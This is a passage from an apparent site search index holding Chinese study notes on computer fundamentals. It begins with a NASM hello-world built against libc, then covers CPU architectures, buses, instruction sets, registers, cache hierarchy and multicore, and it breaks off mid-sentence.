;\u6e05\u7a7arax\uff0c\u7528\u4e8e\u63a5\u6536\u8fd4\u56de\u503c\uff0c\u867d\u7136printf\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\n        call    printf\n\n        mov     rax, 0\n        pop     rbx     ;\u6062\u590d\u73b0\u573a\n        ret\n</code></pre> <p>\u53ef\u4ee5\u8fd9\u6837\u7f16\u8bd1\u8fd0\u884c\u5b83\uff0c\u5e76\u67e5\u770b\u5b83\u7684\u4f9d\u8d56: <pre><code>[ubuntu] ~/.mac/assem $ nasm -g -F dwarf -f elf64 -o libc.o libc.s\n[ubuntu] ~/.mac/assem $ gcc -no-pie -o libc libc.o\n[ubuntu] ~/.mac/assem $ ./libc\nhello world!\n[ubuntu] ~/.mac/assem $ ldd libc\n    linux-vdso.so.1 (0x00007ffc2f180000)\n    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe329bdd000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007fe329fce000)\n</code></pre></p>"},{"location":"sicp/hardware/","title":"\u8ba1\u7b97\u673a\u79d1\u5b66\u57fa\u7840\u77e5\u8bc6\u4e4b\u786c\u4ef6\u90e8\u5206","text":"<p>\u73b0\u4ee3\u8ba1\u7b97\u673a\u4f53\u7cfb\u7684\u57fa\u7840\u7406\u8bba\u90e8\u5206\u4ecd\u7136\u662f70\u5e74\u4ee3\u5c31\u5df2\u7ecf\u4ea7\u751f\u7684\uff0c\u8fd9\u4e9b\u5e74\u6765\u4e00\u76f4\u6ca1\u6709\u591a\u5927\u7a81\u7834\uff0c\u53ea\u662f\u5236\u9020\u6c34\u5e73\u548c\u52a0\u5de5\u5de5\u827a\u5728\u9010\u6b65\u63d0\u5347\u3002\u672a\u6765\u9664\u975e\u662f\u91cf\u5b50\u8ba1\u7b97\u3001\u751f\u7269\u8ba1\u7b97\u7b49\u53d1\u5c55\u6210\u719f\uff0c\u624d\u53ef\u80fd\u4f7f\u5f97\u8ba1\u7b97\u673a\u57fa\u7840\u7406\u8bba\u83b7\u5f97\u9769\u547d\u6027\u7a81\u7834\u3002</p> <p>\u6211\u4eec\u5728\u5e94\u7528\u8f6f\u4ef6\u5f00\u53d1\u9886\u57df\uff0c\u5f80\u5f80\u975e\u5e38\u5584\u4e8e\u521b\u9020\u5305\u88c5\u4e00\u4e9b\u540d\u8bcd\uff0c\u4f46\u5b83\u4eec\u7684\u672c\u8d28\u5c31\u662f\u90a3\u4e48\u56de\u4e8b\uff0c\u5b66\u4e60\u8ba1\u7b97\u673a\u4f53\u7cfb\u7684\u7406\u8bba\u6709\u52a9\u4e8e\u6211\u4eec\u6293\u4f4f\u8fd9\u4e9b\u672c\u8d28\u3002</p>"},{"location":"sicp/hardware/#_2","title":"\u4f53\u7cfb\u7ed3\u6784","text":"<p>CPU\u8981\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b83\u9700\u8981\u6307\u4ee4\u548c\u6570\u636e\uff0c\u6307\u4ee4\u76f8\u5f53\u4e8e\u4f60\u8981\u5e72\u4ec0\u4e48\uff0c\u6570\u636e\u662f\u5e72\u8fd9\u4ef6\u4e8b\u6240\u9700\u8981\u7684\u6750\u6599\u3002</p>"},{"location":"sicp/hardware/#_3","title":"\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784","text":"<p> \u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u200b\u5c31\u662f\u628a\u6307\u4ee4\u4e5f\u5f53\u505a\u6570\u636e\uff0c\u628a\u6307\u4ee4\u548c\u6570\u636e\u653e\u5728\u4e00\u8d77\u3002\u597d\u5904\u5c31\u662f\u8bbe\u8ba1\u4e0a\u4f1a\u7b80\u5355\u4e00\u4e9b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e00\u6761\u603b\u7ebf\u96c6\u4e2d\u5b58\u50a8\uff1b\u53e6\u5916\u5b83\u8fd8\u91c7\u7528\u4e86\u4e8c\u8fdb\u5236\u7f16\u7801\u7684\u7ebf\u6027\u5730\u5740\u7a7a\u95f4\u3002\u7f3a\u70b9\u5c31\u662f\u5b83\u7684\u6570\u636e\u4f20\u8f93\u6548\u7387\u8fdc\u4f4e\u4e8eCPU\u7684\u8fd0\u7b97\u6548\u7387\uff0c\u56e0\u6b64\u9700\u8981\u7f13\u5b58\u6765\u63d0\u5347\u6548\u7387\u3002</p> <p>\u5b83\u7684CPU\u6709\u4e24\u5957\u5355\u5143\uff1a  - ALU \u200b\u200b\uff1a\u7b97\u672f\u903b\u8f91\u5355\u5143\uff0c\u5b9e\u73b0\u591a\u7ec4\u7b97\u672f\u548c\u903b\u8f91\u8fd0\u7b97\u3002\u7531\u4e0e\u95e8\u548c\u6216\u95e8\u7ec4\u6210\uff0c\u8fdb\u884c\u4e8c\u8fdb\u5236\u7684\u7b97\u672f\u8fd0\u7b97\uff0c\u5305\u62ec\u52a0\u3001\u51cf\u3001\u4e58\u3001\u4e0e\u3001\u6216\u3001\u975e\u3001\u5f02\u6216\u3002  - CU \u200b\u200b\uff1a\u63a7\u5236\u5355\u5143\uff0c\u7528\u4e8e\u7a0b\u5e8f\u6d41\u7a0b\u7684\u7ba1\u7406\u3002\u4ece\u5185\u5b58\u4e2d\u53d6\u6307\u4ee4\u653e\u5165\u6307\u4ee4\u5bc4\u5b58\u5668\u4e2d\u5206\u6790\u5e76\u6267\u884c\u3002</p> <p>PS\uff1a\u5728\u7cfb\u7edf\u5c42\u9762\u4e0a\uff0c\u6211\u4eec\u8bf4\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u6307\u7269\u7406\u4e0a\u7684\u4e24\u6839\u5185\u5b58\u6761\uff0c\u90a3\u4e2a\u53eb\u4e3b\u5b58\u3002\u6bd4\u5982\u786c\u76d8\u4e0a\u7684\u7f13\u5b58\u4e5f\u662f\u5185\u5b58\u3001\u6253\u5370\u673a\u4e0a\u4e5f\u6709\u7f13\u5b58\u7b49\u7b49\u3002</p>"},{"location":"sicp/hardware/#_4","title":"\u54c8\u4f5b\u7ed3\u6784","text":"<p> \u54c8\u4f5b\u7ed3\u6784\u200b\u5c06\u6307\u4ee4\u548c\u6570\u636e\u5206\u5f00\u5904\u7406\uff0c\u6307\u4ee4\u548c\u6570\u636e\u62e5\u6709\u4e0d\u540c\u7684\u603b\u7ebf\u548c\u5730\u5740\u7a7a\u95f4\uff0c\u5e76\u884c\u80fd\u529b\u975e\u5e38\u5f3a\uff0c\u65e9\u671f\u7684\u5927\u578b\u8ba1\u7b97\u673a\u5c31\u91c7\u7528\u8fd9\u79cd\u7ed3\u6784\u3002\u7f3a\u70b9\u5c31\u662f\u65e9\u671f\u7535\u5b50\u7535\u8def\u6602\u8d35\uff0c\u6210\u672c\u7684\u95ee\u9898\u4f7f\u5f97\u5b83\u4e0d\u9002\u5408\u4e8e\u901a\u7528\u8ba1\u7b97\u673a\u6ca1\u6709\u63a8\u5e7f\u5f00\u6765\u3002 \u73b0\u5728\u7eaf\u7cb9\u7684\u54c8\u4f5b\u7ed3\u6784\u591a\u7528\u4e8e\u6570\u5b57\u4fe1\u53f7\u5904\u7406\u5668(DSP)\u3001\u5355\u7247\u673a\u7b49\u7279\u5b9a\u9886\u57df\uff0c\u5b83\u4eec\u7684\u6307\u4ee4\u76f8\u5bf9\u7b80\u5355\u4e5f\u6ca1\u6709\u7f13\u5b58\u3002</p>"},{"location":"sicp/hardware/#_5","title":"\u5bf9\u6bd4\u603b\u7ed3","text":"<p>\u5b9e\u9645\u4e0a\u73b0\u4ee3\u8ba1\u7b97\u673a\u662f\u5bf9\u4e24\u79cd\u67b6\u6784\u505a\u4e86\u4e00\u4e9b\u6298\u4e2d\u7684\u3002\u5728\u5185\u5b58\u4e2d\u6307\u4ee4\u548c\u6570\u636e\u662f\u5728\u4e00\u8d77\u7684\uff0c\u5728CPU\u7684L1\u7f13\u5b58\u4e2d\uff0c\u4f1a\u533a\u5206\u6307\u4ee4\u7f13\u5b58\u548c\u6570\u636e\u7f13\u5b58\uff0c\u6700\u7ec8\u6267\u884c\u7684\u65f6\u5019\u6307\u4ee4\u548c\u6570\u636e\u662f\u4ece\u4e24\u4e2a\u4e0d\u540c\u7684\u5730\u65b9\u51fa\u6765\u7684\u3002\u53e6\u5916\u51af\u8bfa\u4f9d\u66fc\u7edf\u4e00\u7684\u5730\u5740\u7a7a\u95f4\u4e5f\u4fbf\u4e8e\u6211\u4eec\u5b9e\u73b0\u64cd\u4f5c\u7cfb\u7edf\u5185\u5b58\u7684\u7ba1\u7406\u3001\u52a8\u6001\u52a0\u8f7d\u7a0b\u5e8f\u3001JIT\u7b49\u3002</p>"},{"location":"sicp/hardware/#_6","title":"\u603b\u7ebf","text":"<p>\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684\u603b\u7ebf\u672a\u5fc5\u662f\u7535\u8def\u677f\u4e0a\u4e00\u6761\u6761\u7ebf\u8def\uff0c\u5b83\u53ea\u662f\u4e00\u79cd\u65b9\u5f0f\uff0c\u53ef\u80fd\u662f\u8f6f\u4ef6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u786c\u4ef6\u7684\uff0c\u4ee3\u8868\u4e86\u4e00\u6574\u5957\u7684\u89c4\u8303\u4f53\u7cfb\u3002\u5c31\u50cf\u9ad8\u901f\u516c\u8def\u4ea4\u901a\u7f51\uff0c\u5305\u62ec\u4e86\u516c\u8def\u3001\u6536\u8d39\u7ad9\u3001\u52a0\u6cb9\u7ad9\u3001\u7ef4\u62a4\u4eba\u5458\u3001\u4ea4\u901a\u89c4\u5219\u3001\u4fe1\u53f7\u706f\u6307\u793a\u724c\uff0c\u603b\u7ebf\u4e5f\u662f\u4e00\u6837\uff0c\u9664\u4e86\u6570\u636e\u901a\u9053\uff0c\u8fd8\u5305\u62ec\u4e86\u6570\u636e\u4ea4\u6362\u65b9\u5f0f\uff0c\u6bd4\u5982\u4ece\u4f55\u5904\u53d6(\u5185\u5b58)\uff0c\u4ece\u54ea\u5f00\u59cb\u4ece\u54ea\u7ed3\u675f\u6709\u591a\u957f\uff0c\u53d6\u51fa\u6765\u7684\u662f\u6570\u636e\u8fd8\u662f\u5730\u5740\u7b49\u3002</p> <p>\u73b0\u5728\u4e3b\u6d41\u7684\u603b\u7ebf\u6807\u51c6\u4e3aPCI/PCIe\uff0c\u8be5\u6807\u51c6\u7684\u5e26\u5bbd\u9ad8\uff0c\u80fd\u63a2\u6d4b\u786c\u4ef6\u53d8\u66f4\uff0c\u652f\u6301\u70ed\u63d2\u62d4\u3002</p>"},{"location":"sicp/hardware/#_7","title":"\u603b\u7ebf\u7ed3\u6784","text":"<p>\u6309\u7167\u4e0d\u540c\u7684\u4f20\u8f93\u901f\u5ea6\uff0c\u6211\u4eec\u4f1a\u628a\u603b\u7ebf\u5206\u5f00\uff0c\u901a\u8fc7\u4e0d\u540c\u7684\u901f\u5ea6\u6765\u8fdb\u884c\u5206\u6d41\uff0c\u4f7f\u5feb\u901f\u7684\u90e8\u5206\u62e5\u6709\u66f4\u591a\u7684\u6d41\u91cf\u5e26\u5bbd\u3002\u5317\u6865\u82af\u7247\u5904\u7406\u5feb\u901f\u8bbe\u5907\uff0c\u4f8b\u5982CPU\u3001\u5185\u5b58\u3001\u663e\u5361\u7b49\uff0c\u5357\u6865\u82af\u7247\u5904\u7406\u6162\u901f\u8bbe\u5907\uff0c\u4f8b\u5982\u786c\u76d8\u3001\u7f51\u5361\u7b49\u3002</p> <p> \u524d\u7aef\u603b\u7ebf(FSB)\u8d1f\u8d23CPU\u4e0e\u5317\u6865\u82af\u7247\u7684\u6570\u636e\u4f20\u8f93\uff0c\u4ee3\u8868CPU\u4e0e\u5916\u754c\u6570\u636e\u7684\u901a\u8baf\u901f\u5ea6\uff0c\u76f8\u5f53\u4e8eCPU\u80fd\u5904\u7406\u7684\u6700\u9ad8\u80fd\u529b\u3002\u800c\u200b\u540e\u7aef\u603b\u7ebf(BSB)\u8d1f\u8d23\u4e0eCPU\u5185\u6838\u901a\u8baf\uff0c\u5176\u901f\u5ea6\u9ad8\u4e8eFSB\u3002\u73b0\u5728\u7684\u82af\u7247\u96c6\u6210\u5ea6\u8d8a\u6765\u8d8a\u9ad8\u7684\u8d8b\u52bf\u4e5f\u6b63\u662f\u56e0\u4e3a\u60f3\u51cf\u5c11\u5404\u6837\u7684\u603b\u7ebf\u6765\u63d0\u5347\u5404\u90e8\u4ef6\u4e4b\u95f4\u4f20\u8f93\u7684\u901f\u5ea6\u3002</p>"},{"location":"sicp/hardware/#_8","title":"\u4e2d\u592e\u5904\u7406\u5668","text":"<p>\u4e2d\u592e\u5904\u7406\u5668\u200b\u662f\u7528\u6765\u89e3\u91ca\u6307\u4ee4\u3001\u5904\u7406\u6570\u636e\u7684\u3002\u7f16\u7a0b\u5b9e\u8d28\u4e0a\u5c31\u662f\u9488\u5bf9CPU\u800c\u8a00\u7684\u3002\u4f8b\u5982\u6211\u4eec\u5f80\u786c\u76d8\u91cc\u5199\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c31\u8981\u77e5\u9053\u6587\u4ef6\u540d\u79f0\u3001\u5199\u5728\u54ea\u4e2a\u5730\u5740\u3001\u5199\u5165\u7684\u957f\u5ea6\u7b49\uff0c\u5373\u4f7f\u8fd9\u4e9b\u5de5\u4f5c\u4e0d\u5168\u662f\u7531CPU\u5b8c\u6210\uff0cCPU\u81f3\u5c11\u4e5f\u8981\u5b8c\u6210\u5176\u4e2d\u7684\u8c03\u5ea6\u5de5\u4f5c\u3002</p>"},{"location":"sicp/hardware/#_9","title":"\u4e3b\u9891\u3001\u5916\u9891","text":"<p>\u4e3b\u9891\u200b\u662f\u5185\u6838\u5de5\u4f5c\u9891\u7387\uff0c\u8868\u8fbe\u8109\u51b2\u4fe1\u53f7\u7684\u9707\u8361\u901f\u5ea6\uff0c\u4e0eCPU\u7684\u5b9e\u9645\u8fd0\u7b97\u80fd\u529b\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002\u800c\u200b\u5916\u9891\u200b\u200b\u662f\u5185\u6838\u4e0e\u4e3b\u677f\u95f4\u7684\u540c\u6b65\u901f\u5ea6\uff0c\u540c\u65f6\u4e5f\u662f\u5185\u5b58\u548c\u4e3b\u677f\u4e4b\u95f4\u7684\u540c\u6b65\u901f\u5ea6\u3002</p> <p>\u5bf9\u73b0\u4ee3\u7684CPU\u800c\u8a00\uff0c\u8861\u91cf\u5176\u8fd0\u7b97\u901f\u5ea6\u548c\u6027\u80fd\u8981\u770b\u5404\u65b9\u9762\u7684\u6027\u80fd\u6307\u6807\uff0c\u4f8b\u5982\u7f13\u5b58\u3001\u6307\u4ee4\u96c6\u7b49\u3002\u5f88\u53ef\u80fd\u51fa\u73b0\u4e3b\u9891\u8f83\u9ad8\u7684CPU\u5b9e\u9645\u8fd0\u7b97\u901f\u5ea6\u8f83\u4f4e\u7684\u60c5\u51b5\u3002</p>"},{"location":"sicp/hardware/#_10","title":"\u6307\u4ee4\u96c6","text":"<p>\u6307\u4ee4\u96c6\u200b\u662f\u5305\u542b\u4e86\u57fa\u672c\u6570\u636e\u7c7b\u578b\u3001\u6307\u4ee4\u3001\u5bc4\u5b58\u5668\u3001\u5bfb\u5740\u6a21\u5f0f\u3001\u5b58\u50a8\u4f53\u7cfb\u3001\u4e2d\u65ad\u548c\u5f02\u5e38\u5904\u7406\u7b49\u6253\u5305\u7684\u4e00\u5957\u89c4\u8303\uff0c\u662fCPU\u771f\u6b63\u80fd\u591f\u7406\u89e3\u7684\u4e1c\u897f\u3002</p> <p>\u6211\u4eec\u901a\u5e38\u5206\u4e3a\u200b\u7cbe\u7b80\u6307\u4ee4\u96c6\u200b(RISC)\u548c\u200b\u590d\u6742\u6307\u4ee4\u96c6\u200b(CISC)\u3002</p> <p>\u5178\u578b\u7684\u590d\u6742\u6307\u4ee4\u96c6\u5c31\u662fx86\uff0c\u5b83\u7684\u6307\u4ee4\u7279\u522b\u591a\uff0c\u529f\u80fd\u4e30\u5bcc\uff0c\u4f46\u6bcf\u6761\u6307\u4ee4\u7684\u5b57\u957f\u4e0d\u7b49\uff0c\u4e5f\u5c31\u9020\u6210\u4e86\u5b83\u9700\u8981\u5148\u8bfb\u51fa\u6307\u4ee4\u624d\u77e5\u9053\u540e\u9762\u7684\u6570\u636e/\u53c2\u6570\u6709\u591a\u957f\uff0c\u6267\u884c\u901f\u5ea6\u76f8\u5bf9\u8f83\u6162\u3002\u800c\u6709\u4e00\u4e9b\u865a\u62df\u673a\u5185\u4f1a\u628a\u6307\u4ee4\u8bbe\u7f6e\u4e3a\u5b9a\u957f\u7684\uff0c\u9ed8\u8ba4\u5c31\u662f\u4e24\u4e2a\u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u7684\u7f13\u5b58\u4eb2\u548c\u6027\u597d\uff0c\u6548\u7387\u5c31\u9ad8\u3002x86\u8fd9\u4e48\u8bbe\u8ba1\u6709\u4e00\u4e9b\u5386\u53f2\u539f\u56e0\uff0c\u5f53\u65f6\u8fd8\u6ca1\u6709CPU\u7f13\u5b58\u7684\u6982\u5ff5\u3002\u800c\u7cbe\u7b80\u6307\u4ee4\u96c6\u5728\u65e9\u671f\u53cd\u800c\u662f\u4e00\u79cd\u9ad8\u5927\u4e0a\u7684\u4e1c\u897f\uff0c\u5b83\u7684\u6307\u4ee4\u548c\u5bfb\u5740\u65b9\u5f0f\u5c11\uff0c\u683c\u5f0f\u7edf\u4e00\uff0c\u5e76\u884c\u901f\u5ea6\u5feb\uff0c\u4e3b\u8981\u7528\u4e8e\u5927\u578b\u673a\u548c\u4e2d\u9ad8\u6863\u670d\u52a1\u5668\u4e2d\u3002</p> <p>Intel\u8ba4\u4e3a\u81ea\u5df1\u5b9a\u4e49\u7684x86\u6307\u4ee4\u96c6\u7531\u4e8e\u5386\u53f2\u539f\u56e0\u7b49\u4e0d\u597d\uff0c\u4e8e\u662f\u572864\u4f4d\u65f6\u4ee3\u5b9a\u4e49\u4e86IA-64\u6307\u4ee4\u96c6\uff0c\u4f46\u8fd9\u79cd\u6307\u4ee4\u96c6\u548c\u4ee5\u524d\u7684x86\u5e76\u4e0d\u517c\u5bb9\uff0c\u5b83\u91c7\u7528\u4e86\u6a21\u62df\u7684\u65b9\u5f0f\u53bb\u8fd0\u884cx86\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5728\u5f53\u65f6\u7684windows2000\u7b49\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u4e0d\u597d\uff0c\u6240\u4ee5\u5fae\u8f6f\u6301\u53cd\u5bf9\u6001\u5ea6\u3002\u6b64\u65f6AMD\u6293\u4f4f\u4e86\u673a\u4f1a\uff0c\u5b83\u57fa\u4e8e\u539f\u6709\u7684386/IA-32\u6807\u51c6\u505a\u4e86\u6269\u5145\uff0c\u4e5f\u5c31\u6709\u4e86\u73b0\u5728\u7684x86-64\u6307\u4ee4\u96c6\uff0c\u4e5f\u53ef\u4ee5\u53eb\u505ax64\u6216AMD64\u3002\u540e\u6765\uff0cIntel\u8feb\u4e8e\u5176\u4ed6\u5382\u5546\u7684\u538b\u529b\uff0c\u4e5f\u53bb\u4f7f\u7528AMD64\u6307\u4ee4\u96c6\uff0c\u5e76\u5728\u540e\u6765\u53d1\u5c55\u51fa\u4e86\u517c\u5bb9\u7684Intel 64\uff0c\u8fd9\u79cd\u6307\u4ee4\u96c6\u548cAMD64\u5927\u90e8\u5206\u662f\u76f8\u540c\u7684\u3002</p> <p>32\u4f4d\u5904\u7406\u5668\u7684\u6700\u5927\u5bfb\u5740\u4e3a4GB(2\u768432\u6b21\u65b9)\uff0c\u4f4664\u4f4d\u5904\u7406\u5668\u7684\u6700\u5927\u5bfb\u5740\u5374\u4e0d\u662f2\u768464\u6b21\u65b9\u3002\u6211\u4eec\u77e5\u9053\u5b58\u50a8\u5355\u4f4d\u7684\u7ea7\u522b\u4ece\u5c0f\u5230\u5927\u5206\u522b\u4e3aBytes\u3001KB\u3001MB\u3001GB\u3001TB\u3001PB\u3001EB\uff0c\u6bcf\u7ea7\u90fd\u7b49\u4e8e\u524d\u4e00\u7ea7*1024\uff0c\u6240\u4ee5AMD64\u7406\u8bba\u4e0a\u53ef\u4ee5\u8bbf\u95ee16EB\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u4f46\u76ee\u524d\u7684\u64cd\u4f5c\u7cfb\u7edf\u53ea\u652f\u6301\u523048\u4f4d\uff0c\u4e5f\u5c31\u662f256TB\u7684\u6700\u5927\u5bfb\u5740\uff0c\u8fd9\u79cd\u8bbe\u5b9a\u7684\u6839\u672c\u539f\u56e0\u5c31\u662f\u80fd\u964d\u4f4e\u6210\u672c\u3002</p> <p>\u6b64\u5916\uff0cAMD64\u91cc\u589e\u52a0\u4e86R8-R15\u7684\u901a\u7528\u5bc4\u5b58\u5668\u3002</p>"},{"location":"sicp/hardware/#_11","title":"\u5bc4\u5b58\u5668\u548c\u7f13\u5b58","text":"<p> \u5bc4\u5b58\u5668\u200b\u662f\u6240\u6709\u5b58\u50a8\u4f53\u91cc\u6700\u5feb\u7684\u4e00\u4e2a\uff0c\u56e0\u4e3a\u6570\u91cf\u5c11\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7ed9\u6bcf\u4e2a\u5bc4\u5b58\u5668\u53d6\u4e2a\u540d\u5b57\uff0c\u800c\u65e0\u9700\u7528\u5730\u5740\u3002</p> <p>\u65e9\u671f\uff0c\u6570\u636e\u7531\u786c\u76d8\u5230\u5185\u5b58\uff0c\u518d\u7ecf\u8fc7\u524d\u7aef\u603b\u7ebf\u76f4\u63a5\u5230\u5bc4\u5b58\u5668\uff0c\u56e0\u4e3a\u524d\u7aef\u603b\u7ebf\u4f20\u8f93\u7684\u6548\u7387\u8fdc\u4f4e\u4e8eCPU\u8fd0\u7b97\u7684\u6548\u7387\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6027\u80fd\uff0c\u6211\u4eec\u5728CPU\u5185\u90e8\uff0c\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e4b\u95f4\u589e\u52a0\u4e86\u4e00\u5c42cache\uff0c\u4f7f\u5f97\u524d\u7aef\u603b\u7ebf\u6bcf\u6b21\u4f20\u8f93\u66f4\u591a\u7684\u5185\u5bb9\u8fdb\u5165CPU\u3002\u65e9\u671f\u7684CPU\u7f13\u5b58\u53ea\u6709L1\uff0c\u5b83\u5c06\u6307\u4ee4\u548c\u6570\u636e\u5206\u5f00\uff1b\u540e\u6765\u53d1\u5c55\u81f3L2\uff0cL2\u4e0d\u533a\u5206\u6307\u4ee4\u548c\u6570\u636e\uff1b\u518d\u540e\u6765\u591a\u6838\u65f6\u4ee3\u6709\u4e86L3\uff0c\u80fd\u5728\u4e00\u4e2a\u7269\u7406\u5904\u7406\u5668\u7684\u591a\u4e2a\u6838\u4e2d\u5171\u4eab\u3002</p> <p>\u7f13\u5b58\u53ea\u662f\u89e3\u51b3\u6027\u80fd\u95ee\u9898\u7684\u4e00\u4e2a\u5a92\u4ecb\uff0c\u5b83\u672c\u8eab\u6709\u6613\u4e22\u5931\u3001\u6613\u8986\u76d6\u7684\u7279\u6027\uff0c\u4e0d\u80fd\u50cf\u5bc4\u5b58\u5668\u548c\u4e3b\u5b58\u4e00\u6837\u5f53\u505a\u76ee\u6807\u5b58\u50a8\u5668\u4f7f\u7528\u3002\u5f53CPU\u9700\u8981\u4e00\u4e2a\u6570\u636e\u65f6\uff0c\u5b83\u4f1a\u5148\u53bbL1\u627e\uff0c\u627e\u4e0d\u5230\u5219\u53bbL2\uff0c\u518d\u627e\u4e0d\u5230\u53bbL3\u627e\uff0c\u518d\u627e\u4e0d\u5230\u5c31\u4f1a\u53bb\u7cfb\u7edf\u603b\u7ebf\uff0c\u627e\u5230\u4ee5\u540e\u6279\u91cf\u7684\u4f20\u5230L3\uff0c\u518d\u628a\u547d\u4e2d\u7684\u4e00\u90e8\u5206\u586b\u5145\u81f3L2\uff0c\u518d\u586b\u5145\u81f3L1\uff0c\u518d\u8fd4\u56de\u7ed9\u5904\u7406\u5668\u3002\u6240\u4ee5L1\u91cc\u6709\u7684\u6570\u636eL2\u3001L3\u80af\u5b9a\u6709\uff0c\u6bcf\u7ea7\u7f13\u5b58\u6570\u636e\u90fd\u662f\u4e0b\u4e00\u7ea7\u7684\u4e00\u90e8\u5206\u3002</p> <p>\u540c\u65f6\uff0c\u57fa\u4e8e\u200b\u65f6\u95f4\u5c40\u90e8\u6027\u200b(\u6b63\u5728\u88ab\u8bbf\u95ee\u7684\u6570\u636e\u53ef\u80fd\u8fd1\u671f\u518d\u6b21\u88ab\u8bbf\u95ee)\u3001\u7a7a\u95f4\u5c40\u90e8\u6027(\u4e34\u8fd1\u5730\u5740\u6570\u636e\u53ef\u80fd\u5373\u5c06\u88ab\u8bbf\u95ee)\u3001\u987a\u5e8f\u5c40\u90e8\u6027(\u5927\u90e8\u5206\u6307\u4ee4\u662f\u987a\u5e8f\u6267\u884c)\uff0c\u53ef\u4ee5\u8ba9\u7f13\u5b58\u6709\u8f83\u9ad8\u7684\u547d\u4e2d\u7387\u3002(PS:\u6211\u4eec\u5b8f\u89c2\u4e16\u754c\u7684\u7f13\u5b58\u4f8b\u5982web\u670d\u52a1\u4e2d\u7684memcache\u5f80\u5f80\u53ea\u662f\u57fa\u4e8e\u65f6\u95f4\u5c40\u90e8\u6027\uff0c\u56e0\u4e3aCPU\u662f\u9488\u5bf9\u6307\u4ee4\u548c\u5b57\u8282\u7684\u624d\u53bb\u8ba8\u8bba\u5176\u7a7a\u95f4\u5c40\u90e8\u6027\u548c\u987a\u5e8f\u5c40\u90e8\u6027)\u3002</p> <p>\u6211\u4eec\u5199\u7a0b\u5e8f\u8981\u5c3d\u53ef\u80fd\u7684\u8ba9\u5176\u7f13\u5b58\u4eb2\u548c\u6027\u66f4\u9ad8\uff0c\u6570\u636e\u8fde\u7eed\u6027\u66f4\u9ad8\uff0c\u6bd4\u5982\u6309\u4e00\u5b9a\u957f\u5ea6\u5bf9\u9f50\u67d0\u4e9b\u6570\u636e\uff1b\u5bf9\u4e8e\u6027\u80fd\u8981\u6c42\u9ad8\u7684\u7a0b\u5e8f\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u9501\u6b7b\u4e3b\u5b58\u7684\u4e00\u90e8\u5206\uff0c\u907f\u514d\u88ab\u4ea4\u6362\u5230\u786c\u76d8\u5f53\u4e2d\u53bb\uff1b\u751a\u81f3\u5bf9\u4e8e\u6027\u80fd\u8981\u6c42\u6781\u81f4\u7684\u573a\u666f\uff0c\u53ef\u4ee5\u4f7f\u7528\u6c47\u7f16\u4ee5\u5c3d\u53ef\u80fd\u7684\u4f7f\u7528\u5bc4\u5b58\u5668\u3002</p> <p> \u7f13\u5b58\u7531\u591a\u4e2a\u5757\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5757\u6211\u4eec\u79f0\u4e3acache line\uff0c\u6bcf\u884c\u7684\u6570\u636e\u662f\u8fde\u7eed\u7684\uff0c\u6bcf\u884c\u7684\u5927\u5c0f\u901a\u5e38\u662f64\u5b57\u8282\uff0c\u884c\u4e0e\u884c\u4e4b\u95f4\u53ef\u80fd\u4e0d\u8fde\u7eed\uff0c\u6240\u4ee5\u6211\u4eec\u5bf9\u9f50\u6570\u636e\u7684\u65f6\u5019\u4e5f\u662f\u6309\u884c\u6765\u5bf9\u9f50\u3002\u540c\u65f6\uff0c\u7f13\u5b58\u4e2d\u6709\u5f88\u591a\u7684\u6807\u5fd7\u4f4d\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6807\u5fd7\u4f4d\u53bb\u68c0\u67e5\u7f13\u5b58\u662f\u5426\u66f4\u65b0\uff0c\u4ee5\u51b3\u5b9a\u662f\u5426\u9700\u8981\u7f6e\u6362\u56de\u5185\u5b58\u3002</p>"},{"location":"sicp/hardware/#_12","title":"\u591a\u6838","text":"<p>\u5728\u4e00\u4e2a\u5904\u7406\u5668\u5185\u96c6\u6210\u591a\u4e2a\u72ec\u7acb\u5b9e\u4f53\u7269\u7406\u5185\u6838\u5373\u4e3a\u200b\u591a\u6838\u3002\u6211\u4eec\u63d0\u53caCore1\u3001Core2\u7684\u65f6\u5019\u5c31\u8868\u793a\u591a\u6838\uff0c\u800cCPU1\u3001CPU2\u7684\u65f6\u5019\u5219\u662f\u591a\u4e2aCPU\u3002\u591a\u6838\u80fd\u66f4\u597d\u7684\u5728\u6210\u672c\u548c\u6027\u80fd\u4e0a\u505a\u51fa\u5e73\u8861\uff0c\u4e5f\u4e0d\u4e00\u5b9a\u6bd4\u591aCPU\u6162\uff0c\u8fd9\u4e3b\u8981\u770b\u8f6f\u4ef6\u5c42\u9762\u7684\u4f18\u5316\u3002\u591a\u6838\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u7684L3\u7f13\u5b58\u8fdb\u884c\u901a\u8baf\u6216\u6570\u636e\u5171\u4eab\uff0c\u800c\u591aCPU\u53ea\u80fd\u901a\u8fc7\u524d\u7aef\u603b\u7ebf\u6216\u989d\u5916\u5efa\u7acb\u5176\u4ed6\u5916\u90e8\u901a\u8baf\u673a\u5236\u3002</p> <p>\u591a\u6838\u67b6\u6784\u53c8\u5206\u4e3a\u4e24\u79cd\uff1a</p> <p> 